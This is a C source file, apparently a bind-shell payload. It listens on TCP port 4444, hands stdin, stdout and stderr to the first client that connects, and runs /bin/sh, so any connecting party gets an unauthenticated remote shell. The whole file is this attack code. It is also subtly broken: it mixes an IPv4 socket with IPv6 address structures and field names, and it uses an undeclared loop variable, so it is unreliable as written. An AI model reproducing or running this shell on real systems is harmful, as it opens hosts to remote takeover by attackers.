#include <stdio.h>  
#include <sys/types.h>   
#include <sys/socket.h>  
#include <netinet/in.h>  
  
// sockfd for host 
int host_sockfd;    

// sockfd for client  					   
int client_sockfd;                       
  
// sockaddr_in6 struct    
struct sockaddr_in6 host_addr;              
  
int main()  
{  
    //Create socket  
    host_sockfd = socket(PF_INET, SOCK_STREAM, 0);  
  
    //Initialize sockaddr struct to bind socket using it  
    host_addr.sin_family = AF_INET6;  
    host_addr.sin_port = htons(4444);  
    host_addr.sin_addr = in6addr_any; 
  
    //Bind socket 
    bind(host_sockfd, (struct sockaddr*) &host_addr, sizeof(host_addr));  
      
    //I am listening for connections
    listen(host_sockfd, 2);  
  
    //Just accept incoming connection  
    client_sockfd = accept(host_sockfd, NULL, NULL);  
  
    //Duplicate file descriptors for STDIN, STDOUT and STDERR
    for(i = 0; i <= 2; i++)
       dup2(client_sockfd, i);
  
    // Execute /bin/sh  
    execve("/bin/sh", NULL, NULL);  
    close(host_sockfd);  
      
    return 0;  
}
